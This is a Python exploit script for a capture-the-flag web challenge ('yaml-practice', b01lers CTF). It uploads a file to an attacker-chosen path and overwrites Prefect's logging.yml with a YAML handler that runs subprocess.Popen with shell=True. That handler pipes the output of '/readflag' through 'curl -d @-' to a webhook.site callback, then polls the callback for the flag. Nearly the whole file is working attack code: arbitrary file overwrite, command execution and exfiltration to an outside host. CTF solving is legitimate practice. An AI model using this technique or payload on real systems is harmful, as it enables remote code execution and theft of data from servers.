#!/usr/bin/env python3
import argparse
import re
import secrets
import sys
import time
from typing import Optional

import requests


FLAG_RE = re.compile(r"bctf\{[^}\r\n]+\}")


def upload_yaml(
    session: requests.Session,
    base_url: str,
    filename: str,
    content: str,
    timeout: float,
) -> requests.Response:
    return session.post(
        f"{base_url}/upload",
        files={"file": (filename, content.encode(), "text/plain")},
        timeout=timeout,
    )


def create_webhook_token(
    session: requests.Session,
    webhook_base: str,
    timeout: float,
) -> str:
    response = session.post(
        f"{webhook_base}/token",
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        timeout=timeout,
    )
    response.raise_for_status()
    data = response.json()
    token = data.get("uuid")
    if not token:
        raise RuntimeError(f"Unexpected token response: {data!r}")
    return token


def build_payload(webhook_base: str, token: str) -> str:
    callback_url = f"{webhook_base}/{token}"
    payload = (
        "version: 1\n"
        f"handlers: {{h: {{(): subprocess.Popen, args: /readflag give me the flag|curl -d @- {callback_url}, shell: true}}}}\n"
        "root: {level: INFO, handlers: [h]}"
    )
    size = len(payload.encode())
    if size > 200:
        raise ValueError(
            f"Payload is {size} bytes, which exceeds the 200-byte upload limit."
        )
    return payload


def trigger_validate(
    session: requests.Session,
    base_url: str,
    benign_name: str,
    timeout: float,
) -> None:
    try:
        response = session.post(
            f"{base_url}/validate",
            json={"filename": benign_name},
            timeout=timeout,
        )
        snippet = response.text[:200].replace("\n", "\\n")
        print(f"[*] /validate -> HTTP {response.status_code}: {snippet}")
    except requests.RequestException as exc:
        print(f"[*] /validate ended with {exc.__class__.__name__}: {exc}")


def poll_webhook_for_flag(
    session: requests.Session,
    webhook_base: str,
    token: str,
    poll_interval: float,
    max_wait: float,
    timeout: float,
) -> Optional[str]:
    deadline = time.monotonic() + max_wait
    seen_ids: set[str] = set()

    while time.monotonic() < deadline:
        response = session.get(
            f"{webhook_base}/token/{token}/requests",
            headers={"Accept": "application/json"},
            timeout=timeout,
        )
        response.raise_for_status()
        data = response.json().get("data", [])

        for item in data:
            request_id = item.get("uuid", "")
            content = item.get("content", "")
            if request_id and request_id not in seen_ids:
                seen_ids.add(request_id)
                created_at = item.get("created_at", "unknown-time")
                ip_addr = item.get("ip", "unknown-ip")
                print(f"[*] Callback {request_id} from {ip_addr} at {created_at}")
                if content:
                    print(f"[*] Body: {content!r}")

            match = FLAG_RE.search(content)
            if match:
                return match.group(0)

        time.sleep(poll_interval)

    return None


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Exploit yaml-practice via Prefect logging.yml overwrite"
    )
    parser.add_argument(
        "base_url",
        help="Target base URL, e.g. https://yaml-practice-f7f317f1eb3084b3.b01lersc.tf",
    )
    parser.add_argument(
        "--logging-path",
        default="/app/.venv/lib/python3.14/site-packages/prefect/logging/logging.yml",
        help="Absolute path to Prefect logging.yml inside the container",
    )
    parser.add_argument(
        "--webhook-base",
        default="https://webhook.site",
        help="Base URL for the callback service",
    )
    parser.add_argument(
        "--webhook-token",
        help="Use an existing Webhook.site token instead of creating a new one",
    )
    parser.add_argument(
        "--poll-interval",
        type=float,
        default=2.0,
        help="Seconds between callback polling attempts",
    )
    parser.add_argument(
        "--max-wait",
        type=float,
        default=30.0,
        help="Maximum time to wait for the callback",
    )
    parser.add_argument(
        "--request-timeout",
        type=float,
        default=15.0,
        help="Per-request timeout in seconds",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    webhook_base = args.webhook_base.rstrip("/")
    benign_name = f"{secrets.token_hex(4)}.yml"
    benign_body = "a: 1\n"

    session = requests.Session()

    try:
        token = args.webhook_token or create_webhook_token(
            session, webhook_base, args.request_timeout
        )
        payload = build_payload(webhook_base, token)
    except Exception as exc:
        print(f"[!] Setup failed: {exc}", file=sys.stderr)
        return 1

    print(f"[*] Target: {base_url}")
    print(f"[*] Callback URL: {webhook_base}/{token}")
    print(f"[*] Logging path: {args.logging_path}")
    print(f"[*] Payload size: {len(payload.encode())} bytes")

    print(f"[*] Uploading benign YAML as {benign_name!r}")
    response = upload_yaml(
        session, base_url, benign_name, benign_body, args.request_timeout
    )
    print(f"[*] /upload benign -> HTTP {response.status_code}: {response.text}")
    response.raise_for_status()

    print("[*] Uploading malicious Prefect logging config")
    response = upload_yaml(
        session,
        base_url,
        args.logging_path,
        payload,
        args.request_timeout,
    )
    print(f"[*] /upload payload -> HTTP {response.status_code}: {response.text}")
    response.raise_for_status()

    print("[*] Triggering /validate")
    trigger_validate(session, base_url, benign_name, args.request_timeout)

    print("[*] Polling callback service for the flag")
    try:
        flag = poll_webhook_for_flag(
            session,
            webhook_base,
            token,
            args.poll_interval,
            args.max_wait,
            args.request_timeout,
        )
    except requests.RequestException as exc:
        print(f"[!] Polling failed: {exc}", file=sys.stderr)
        return 1

    if not flag:
        print("[!] No flag received before timeout.", file=sys.stderr)
        print(f"[!] Inspect callback history manually: {webhook_base}/#!/edit/{token}")
        return 1

    print(f"[+] Flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
